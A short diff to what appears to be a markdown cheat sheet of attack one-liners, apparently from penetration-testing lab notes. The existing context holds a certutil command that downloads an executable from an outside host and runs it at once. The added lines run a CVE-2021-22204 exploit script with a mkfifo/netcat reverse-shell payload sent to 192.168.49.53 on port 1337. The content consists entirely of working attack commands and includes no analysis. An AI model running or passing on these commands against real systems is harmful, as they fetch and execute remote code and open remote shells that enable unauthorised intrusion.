@@ -52,3 +52,8 @@ certutil -f -urlcache -split \"http://192.168.49.60:8082/WebIIS.exe\" \"C:\\Wind
 ```
 certutil -f -urlcache -split "http://192.168.49.60:8082/WebIIS.exe" "C:\Windows\Temp\WebIIS.exe" && C:\Windows\Temp\WebIIS.exe
 ```
+
+
+```
+python3 exploit-CVE-2021-22204.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.49.53 1337 >/tmp/f'
+```
